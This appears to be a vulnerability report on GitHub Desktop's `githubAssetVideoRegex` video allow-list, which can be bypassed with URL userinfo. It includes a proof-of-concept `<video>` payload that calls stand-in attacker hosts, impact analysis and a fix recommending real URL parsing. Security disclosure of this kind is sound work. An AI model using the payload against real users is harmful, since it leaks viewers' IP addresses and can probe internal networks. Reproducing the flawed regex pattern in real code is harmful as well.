## Title
Host-anchor regex bypass via URL userinfo (`user@host`) confusion in `githubAssetVideoRegex` allows attacker-hosted `<video>` sources to bypass the GitHub CDN allow‑list — ([File: app/src/lib/markdown-filters/video-url-regex.ts])

### Summary
`githubAssetVideoRegex` is meant to allow only `<video>` tags whose `src` points at GitHub's `user-images.githubusercontent.com` CDN. It is built as a plain string-prefix regex, not a real URL/host parser, so an attacker can construct a syntactically valid URL where the literal text `https://user-images.githubusercontent.com` appears as URL *userinfo* rather than as the *host*. The regex still matches textually, but the browser actually loads the resource from the attacker's host.

### Finding Description
`githubAssetVideoRegex` is defined as: [1](#0-0) 

This anchors on `'^' + escapeRegExp(user_images_cdn_url) + '.+' + videoExtensionRegex.source`, i.e. it only checks that the string *starts with* the literal text `https://user-images.githubusercontent.com`, followed by any characters (`.+`), followed optionally by a known video extension. It does not parse the string as a URL and verify that this literal text is actually the authority/host component.

`VideoTagFilter.filter`/`createFilterTreeWalker` test `el.src` (the DOM-resolved, absolute URL) against this regex, and only strip the `<video>` tag when the test fails: [2](#0-1) 

An attacker can supply, e.g.:
```html
<video src="https://user-images.githubusercontent.com@evil.example/x.mp4"></video>
```
When the browser parses this as a URL, everything before the last `@` in the authority section is treated as *userinfo* and `evil.example` becomes the actual **host**. The DOM `src` getter returns the browser's serialized absolute URL, which — per the WHATWG URL Standard — still contains the literal substring `https://user-images.githubusercontent.com@evil.example/x.mp4` (username is emitted before `@host`). Because the regex is a pure text-prefix match, it never notices that the parsed host is `evil.example`, not `user-images.githubusercontent.com`, so `githubAssetVideoRegex.test(el.src)` returns `true` and `VideoTagFilter.filter` returns `null`, leaving the tag intact.

The video content passes through `DOMPurify.sanitize()` beforehand in `SandboxedMarkdown.renderMarkdown`; no custom `ALLOWED_TAGS`/`ALLOWED_URI_REGEXP` configuration restricting `<video>`/`src` was found in the repo, and DOMPurify's default URI sanitizer permits `https:` URLs (including ones with userinfo), so this attribute is not stripped upstream: [3](#0-2) 

The rendered HTML (including the un-stripped `<video>` tag) is loaded into the sandboxed iframe via a `data:` URI: [4](#0-3) 

The iframe sandbox attribute is `sandbox="allow-same-origin"` only (no `allow-scripts`): [5](#0-4) 

The `sandbox` attribute restricts script execution/navigation/popups, but it does **not** block subresource network requests such as `<video src>` fetches. Consequently, the video element will make an outbound network request to the attacker-controlled host directly from the Electron renderer process.

Regarding the two proof ideas in the question:
- Path traversal (`.../x/../../evil.mp4`): not exploitable — the browser's URL parser normalizes `..` segments *before* `el.src` is read, and the normalized path stays under the same `user-images.githubusercontent.com` host. This does not escape the CDN.
- Userinfo confusion (`...githubusercontent.com@evil.example/...`): **is** exploitable, as detailed above, because the regex has no concept of URL structure (scheme/userinfo/host separation) and purely does substring matching.

### Impact Explanation
This allows an unprivileged attacker who controls PR/commit/issue markdown content (a GitHub API object rendered via `SandboxedMarkdown`, e.g. in `pull-request-quick-view.tsx`, `pull-request-comment-like.tsx`, `release-notes-dialog.tsx`, `copilot-conflicts-resolution-summary.tsx`) to force GitHub Desktop's renderer process to make a direct network request to an attacker-chosen host, bypassing the intended "only GitHub CDN assets are auto-loaded" trust boundary. This can be used for:
- Beaconing/tracking (leaking victim IP address, user agent, and confirming markdown was viewed) without any user interaction, since `<video>` fetches occur automatically at parse time (`preload`/poster behavior can also trigger fetches).
- Potentially probing internal/private network endpoints reachable from the user's machine (SSRF-like resource loading) if the attacker crafts hostnames pointing to internal services.

It does not appear to lead to code execution or renderer sandbox escape given the iframe lacks `allow-scripts`, so the impact is best characterized as an allow-list bypass enabling unauthorized cross-origin resource loading/tracking rather than a full compromise.

### Likelihood Explanation
High likelihood of triggering: any attacker who can post a PR description, PR comment, commit message, or similarly-rendered markdown content controls this input entirely, and no user interaction beyond viewing the PR/commit in Desktop is required for the request to fire.

### Recommendation
Replace the string-prefix regex check with actual URL parsing: parse `el.src` with the `URL` constructor and verify `url.protocol === 'https:'`, `url.hostname === 'user-images.githubusercontent.com'` (or an exact allow-list match), `url.username === ''`, and `url.password === ''`, before accepting the video tag as legitimate. Reject the tag if the parsed hostname doesn't exactly equal the expected CDN host or if userinfo is present.

### Proof of Concept
1. As an attacker, open a PR against a victim's repository (or comment on an issue/PR) with body:
```html
<video src="https://user-images.githubusercontent.com@attacker.example/poc.mp4"></video>
```
2. Victim opens the PR in GitHub Desktop (e.g. via `pull-request-quick-view.tsx` or the PR comment timeline), which renders the body through `SandboxedMarkdown`.
3. `VideoTagFilter.createFilterTreeWalker`/`filter` test `el.src` against `githubAssetVideoRegex`; because `el.src` (browser-resolved) still contains the literal prefix text before `@attacker.example`, the regex matches and the tag is left un-stripped.
4. The renderer's sandboxed iframe issues an HTTP request to `attacker.example/poc.mp4`, confirming the bypass via server logs on `attacker.example` (IP/user-agent captured), while the intended allow-list check believed it was validating a `user-images.githubusercontent.com` URL.

```typescript
  public createFilterTreeWalker(doc: Document): TreeWalker {
    return doc.createTreeWalker(doc.body, NodeFilter.SHOW_ELEMENT, {
      acceptNode: function (el: Element) {
        return !isElement(el, 'video') || githubAssetVideoRegex.test(el.src)
          ? NodeFilter.FILTER_SKIP
          : NodeFilter.FILTER_ACCEPT
      },
    })
  }

  /**
   * Takes a video element who's src host is not a github user asset url and removes it.
   */
  public async filter(node: Node): Promise<ReadonlyArray<Node> | null> {
    if (!isElement(node, 'video') || githubAssetVideoRegex.test(node.src)) {
      // If it is video element with a valid source, we return null to leave it alone.
      // This is different than dotcom which regenerates a video tag because it
      // verifies through a db call that the assets exists
      return null
    }

    // Return empty array so that video tag is removed
    return []
  }
```
